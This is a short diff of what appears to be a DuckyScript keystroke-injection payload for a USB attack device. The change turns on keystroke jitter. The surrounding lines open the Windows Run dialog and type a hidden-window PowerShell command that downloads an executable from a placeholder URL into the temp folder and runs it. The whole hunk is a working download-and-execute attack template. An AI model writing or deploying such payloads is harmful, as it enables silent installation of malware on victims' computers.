@@ -11,6 +11,6 @@ REM "$_JITTER_ENABLED = TRUE" can be disabled
 
 GUI r
 DELAY 500
-$_JITTER_ENABLED = FALSE
+$_JITTER_ENABLED = TRUE
 STRING powershell.exe -WindowStyle Hidden -Command Invoke-WebRequest -Uri '#DDL' -OutFile $env:temp\#FILENAME.exe; Start-Process $env:temp\#FILENAME.exe; Exit"
 ENTER
